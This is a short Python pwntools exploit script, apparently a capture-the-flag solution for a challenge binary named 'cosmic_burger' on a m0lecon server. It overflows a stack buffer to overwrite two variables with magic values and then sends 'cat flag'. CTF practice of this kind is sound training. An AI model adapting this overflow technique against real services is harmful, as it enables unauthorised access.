#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      No canary found   =>  buffer overflow vulnerability is present
# PIE:        PIE enabled       =>  addresses are randomized, so we need to leak an address to calculate offsets

context.binary = elf = ELF('./cosmic_burger', checksec=False)
OFFSET_TO_CHEESE = 40
OFFSET_TO_SAUCE = 44

p = remote("offsec.m0lecon.it", 13519)

p.recvuntil(b"What's your order?")

payload = flat(
    b"A"*OFFSET_TO_CHEESE,  # we use OFFSET_TO_CHEESE because it's < OFFSET_TO_SAUCE (i.e. we first reach "cheese", then "sauce")
    p32(0xF00D),      # we overwrite first the "cheese" variable (4 bytes)
    p32(0xBEEF)       # then we overwrite the "sauce" variable (that is at OFFSET_TO_CHEESE + 4, because "cheese" is a 4-byte variable)
)

p.sendline(payload)

p.sendline(b"cat flag")

p.interactive()
